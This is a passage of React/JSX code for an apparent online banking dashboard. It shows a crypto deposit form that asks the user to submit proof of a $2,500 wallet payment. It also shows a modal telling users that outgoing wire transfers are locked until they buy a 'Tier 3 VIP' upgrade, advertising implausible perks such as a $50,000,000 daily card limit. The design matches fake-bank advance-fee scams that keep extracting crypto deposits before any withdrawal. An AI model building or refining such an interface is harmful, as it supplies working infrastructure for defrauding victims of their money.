                      {walletAddresses[cryptoMethod] || walletAddresses['USDT'] || walletAddresses['BTC']}
                    </span>
                    <div className="p-1.5 bg-slate-800 group-hover:bg-amber-500 group-hover:text-slate-950 text-slate-200 rounded-lg shrink-0 flex items-center gap-1 text-[10px] font-bold transition-all">
                      {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedAddress ? 'Copied!' : 'Copy'}</span>
                    </div>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                disabled={submittingDeposit}
                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2 cursor-pointer"
              >
                {submittingDeposit ? 'Submitting Verification...' : 'Submit $2,500 Payment Proof for Verification'}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Payment Proof Options Modal */}
      <PaymentProofOptionsModal
        isOpen={showProofOptionsModal}
        onClose={() => setShowProofOptionsModal(false)}
        user={user}
        cryptoMethod={cryptoMethod}
        walletAddress={walletAddresses[cryptoMethod]}
        onSelectLiveAgent={handleSelectLiveAgent}
        onSelectSVBLive={handleSelectSVBLive}
        submitting={submittingDeposit}
      />

      {/* Requirement 5 Modal: Tier 3 Upgrade Prompt when user tries to execute transfer with code */}
      {showTier3PromptModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 max-w-md w-full space-y-5 shadow-2xl relative animate-fadeIn text-center">
            <button
              onClick={() => setShowTier3PromptModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
              <ShieldAlert className="w-7 h-7" />
            </div>

            <div className="space-y-2">
              <h3 className="text-lg font-bold text-white">Tier 3 VIP Upgrade Required</h3>
              <p className="text-xs text-slate-300 leading-relaxed">
                Your 4-Digit Security Code is active. However, to complete outgoing wire transfers and bill payments using your code, your account must be upgraded to <span className="font-bold text-amber-400">Tier 3 VIP Verification Status</span>.
              </p>
            </div>

            <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-400 text-left space-y-1">
              <p className="font-semibold text-amber-400">Tier 3 VIP Account Capabilities:</p>
              <ul className="list-disc list-inside space-y-0.5 text-[11px]">
                <li>Unlimited international wire transfers</li>
                <li>$50,000,000 daily card limit & Unlimited monthly limit</li>
                <li>Instant 4-digit code authorization</li>
                <li>Priority 24/7 Treasury support</li>
              </ul>
            </div>

            <div className="flex flex-col gap-2 pt-2">
              <button
                onClick={() => {
                  setShowTier3PromptModal(false);
                  if (onNavigateTab) onNavigateTab('profile');
                }}
                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
              >
                <UserCheck className="w-4 h-4" />
                Upgrade to Tier 3 VIP Status
              </button>

              <button
                onClick={() => setShowTier3PromptModal(false)}
                className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-2.5 rounded-2xl text-xs transition-colors"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
